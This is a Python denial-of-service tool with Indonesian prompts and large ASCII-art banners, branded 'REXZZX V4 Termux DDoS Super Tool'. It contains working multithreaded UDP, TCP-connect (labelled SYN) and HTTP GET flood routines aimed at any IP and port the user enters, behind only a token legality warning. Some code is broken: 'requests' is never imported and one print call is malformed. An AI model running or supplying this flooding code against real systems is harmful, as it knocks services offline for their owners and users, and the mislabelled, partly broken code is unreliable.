#!/usr/bin/env python3
import os
import sys
import socket
import random
import threading
import time
from termcolor import colored, cprint
import pyfiglet
from tqdm import tqdm

# ==============================================
# EXTREME ASCII ART
# ==============================================
def show_banner():
    os.system('clear')
    print(colored("▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄", "red"))
    print(colored(pyfiglet.figlet_format("REXZZX V4", font="bloody"), end="")
    print(colored("▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀", "red"))
    
    print(colored("""
    ╔════════════════════════════════════════════════╗
    ║ ██████╗ ███████╗██╗  ██╗███████╗███████╗██╗  ██╗ ║
    ║ ██╔══██╗██╔════╝╚██╗██╔╝╚════██║╚════██║╚██╗██╔╝ ║
    ║ ██║  ██║█████╗   ╚███╔╝  █████╔╝ █████╔╝ ╚███╔╝  ║
    ║ ██║  ██║██╔══╝   ██╔██╗ ██╔═══╝  ╚═══██╗ ██╔██╗  ║
    ║ ██████╔╝███████╗██╔╝ ██╗███████╗██████╔╝██╔╝ ██╗ ║
    ║ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝ ║
    ╚════════════════════════════════════════════════╝
    """, "cyan"))
    
    print(colored("""
    ╔════════════════════════════════════════════════╗
    ║  ░▒▓█►◄  DARK MODE ACTIVATED  ◄►█▓▒░          ║
    ║                                                ║
    ║   ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄           ║
    ║   █ ███╗   ██╗███████╗████████╗███████╗ █     ║
    ║   █ ████╗  ██║██╔════╝╚══██╔══╝██╔════╝ █     ║
    ║   █ ██╔██╗ ██║█████╗     ██║   █████╗   █     ║
    ║   █ ██║╚██╗██║██╔══╝     ██║   ██╔══╝   █     ║
    ║   █ ██║ ╚████║███████╗   ██║   ███████╗ █     ║
    ║   ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀           ║
    ╚════════════════════════════════════════════════╝
    """, "yellow"))
    
    print(colored("""
    ╔════════════════════════════════════════════════╗
    ║   /\_/\     ╔══════════════════════════════╗   ║
    ║  ( o.o )    ║    TERMUX DDOS SUPER TOOL    ║   ║
    ║   > ^ <     ╚══════════════════════════════╝   ║
    ║                                                ║
    ║  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█   ║
    ║  █ ██╗  ██╗███████╗██╗  ██╗███████╗██████╗ █   ║
    ║  █ ██║  ██║██╔════╝██║  ██║██╔════╝██╔══██╗█   ║
    ║  █ ███████║█████╗  ███████║█████╗  ██████╔╝█   ║
    ║  █ ██╔══██║██╔══╝  ██╔══██║██╔══╝  ██╔══██╗█   ║
    ║  █ ██║  ██║███████╗██║  ██║███████╗██║  ██║█   ║
    ║  █ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝█   ║
    ║  ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀   ║
    ╚════════════════════════════════════════════════╝
    """, "magenta"))

# ==============================================
# ULTIMATE DDOS SYSTEM
# ==============================================
class UltimateDDoS:
    def __init__(self):
        self.attack_running = False
        self.threads = []
        self.packets_sent = 0
        self.attack_time = 0
        
        # Enhanced attack vectors
        self.attack_methods = {
            "UDP_FLOOD": self.udp_flood,
            "SYN_FLOOD": self.syn_flood,
            "HTTP_FLOOD": self.http_flood
        }
        
        # Premium user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
        ]
    
    def show_ddos_art(self):
        print(colored("""
        ╔═══╗╔═══╗╔═══╗╔═══╗    ╔═══╗╔═══╗ ╔═══╗╔═══╗
        ║╔═╗║║╔═╗║║╔═╗║║╔═╗║    ║╔══╝║╔══╝ ║╔═╗║║╔═╗║
        ║╚══╗║╚═╝║║║ ║║║╚═╝║    ║╚══╗║╚══╗ ║╚═╝║║╚═╝║
        ╚══╗║║╔╗╔╝║║ ║║║╔╗╔╝    ║╔══╝║╔══╝ ║╔╗╔╝║╔╗╔╝
        ║╚═╝║║║║╚╗║╚═╝║║║║╚╗    ║║   ║║    ║║║╚╗║║║╚╗
        ╚═══╝╚╝╚═╝╚═══╝╚╝╚═╝    ╚╝   ╚╝    ╚╝╚═╝╚╝╚═╝
        """, "red", attrs=["bold"]))
        
        print(colored("""
        █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
        █ ██████╗ ██████╗  ██████╗ ███████╗██████╗ █
        █ ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗█
        █ ██║  ██║██║  ██║██║   ██║███████╗██████╔╝█
        █ ██║  ██║██║  ██║██║   ██║╚════██║██╔═══╝ █
        █ ██████╔╝██████╔╝╚██████╔╝███████║██║     █
        █ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝     █
        ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
        """, "yellow"))
    
    def start_attack(self):
        show_banner()
        self.show_ddos_art()
        
        print(colored("\n[!] PERINGATAN: DDoS ILEGAL TANPA IZIN!", "red", attrs=["blink"]))
        print(colored("[!] Gunakan hanya untuk testing jaringan sendiri\n", "yellow"))
        
        # Target selection
        target_ip = input(colored("[🌐] Masukkan Target IP: ", "cyan"))
        if not self.validate_ip(target_ip):
            print(colored("[-] Format IP tidak valid!", "red"))
            return
            
        target_port = int(input(colored("[🔌] Target Port (0 untuk random): ", "cyan")))
        duration = int(input(colored("[⏱️] Durasi Serangan (detik): ", "cyan")))
        threads = int(input(colored("[🧵] Jumlah Threads (1-1000): ", "cyan")))
        method = input(colored("[⚔️] Metode (UDP/SYN/HTTP): ", "cyan")).upper()
        
        if method not in self.attack_methods:
            print(colored("[-] Metode tidak valid!", "red"))
            return
            
        # Attack confirmation
        print(colored(f"\n[🔥] MEMULAI SERANGAN KE {target_ip}:{target_port}", "red", attrs=["bold"]))
        print(colored(f"[⚡] Metode: {method} | Threads: {threads} | Durasi: {duration}s", "yellow"))
        
        # Progress bar animation
        for _ in tqdm(range(5), desc=colored("Mempersiapkan Serangan", "green"), ncols=100):
            time.sleep(0.2)
        
        # Start attack
        self.attack_running = True
        self.packets_sent = 0
        self.attack_time = time.time()
        
        for _ in range(threads):
            t = threading.Thread(target=self.attack_methods[method], 
                               args=(target_ip, target_port, duration))
            t.daemon = True
            t.start()
            self.threads.append(t)
        
        # Attack monitor
        self.monitor_attack(duration)
        
        # Cleanup
        self.attack_running = False
        for t in self.threads:
            t.join()
            
        print(colored("\n[✅] SERANGAN SELESAI!", "green", attrs=["bold"]))
        print(colored(f"[📊] Total Paket Dikirim: {self.packets_sent:,}", "cyan"))
        print(colored(f"[⏱️] Waktu Serangan: {time.time() - self.attack_time:.2f}s\n", "cyan"))
    
    def monitor_attack(self, duration):
        start_time = time.time()
        while time.time() - start_time < duration and self.attack_running:
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            
            # Real-time stats
            print(colored(f"\r[⚡] Serangan Berjalan | {elapsed}s/{duration}s | {self.packets_sent:,} paket", "yellow"), end="")
            time.sleep(0.5)
        
    def udp_flood(self, ip, port, duration):
        timeout = time.time() + duration
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        
        while time.time() < timeout and self.attack_running:
            try:
                sock.sendto(bytes, (ip, port))
                self.packets_sent += 1
            except:
                pass
        sock.close()
    
    def syn_flood(self, ip, port, duration):
        timeout = time.time() + duration
        while time.time() < timeout and self.attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, port))
                s.close()
                self.packets_sent += 1
            except:
                pass
    
    def http_flood(self, ip, port, duration):
        timeout = time.time() + duration
        url = f"http://{ip}:{port}/"
        
        while time.time() < timeout and self.attack_running:
            try:
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Accept": "text/html,application/xhtml+xml",
                    "Connection": "keep-alive"
                }
                requests.get(url, headers=headers, timeout=5)
                self.packets_sent += 1
            except:
                pass
    
    def validate_ip(self, ip):
        try:
            socket.inet_aton(ip)
            return True
        except:
            return False

# ==============================================
# MAIN MENU SYSTEM
# ==============================================
def main_menu():
    show_banner()
    print(colored("\n" + "═"*60, "blue"))
    print(colored("🔥 MAIN MENU".center(60), "red", attrs=["bold"]))
    print(colored("═"*60, "blue"))
    
    print(colored("""
    1. 💣 Ultimate DDoS Attack
    2. 📶 WiFi Hacking Toolkit
    3. 🌐 Web Penetration Tools
    4. 🔍 OSINT Investigation Suite
    5. ⚙️ System Settings
    """, "cyan"))
    
    print(colored("═"*60, "blue"))
    print(colored("0. ❌ Exit Program".center(60), "red"))
    print(colored("═"*60 + "\n", "blue"))

# ==============================================
# MAIN EXECUTION
# ==============================================
if __name__ == "__main__":
    try:
        # Check Python version
        if sys.version_info[0] < 3:
            print(colored("[!] Python 3 diperlukan!", "red"))
            sys.exit(1)
            
        # Main loop
        while True:
            main_menu()
            choice = input(colored("[?] Pilih Menu: ", "yellow"))
            
            if choice == "1":
                ddos = UltimateDDoS()
                ddos.start_attack()
                input(colored("\n[!] Tekan Enter untuk kembali...", "yellow"))
            elif choice == "0":
                print(colored("\n[👋] Keluar dari program...", "green"))
                break
            else:
                print(colored("\n[-] Fitur dalam pengembangan!", "red"))
                input(colored("[!] Tekan Enter untuk melanjutkan...", "yellow"))
                
    except KeyboardInterrupt:
        print(colored("\n[!] Dihentikan oleh pengguna", "red"))
    except Exception as e:
        print(colored(f"\n[💀] Error fatal: {str(e)}", "red"))
    finally:
        print(colored("\n[✨] Terima kasih telah menggunakan REXZZX TOOLS", "cyan"))
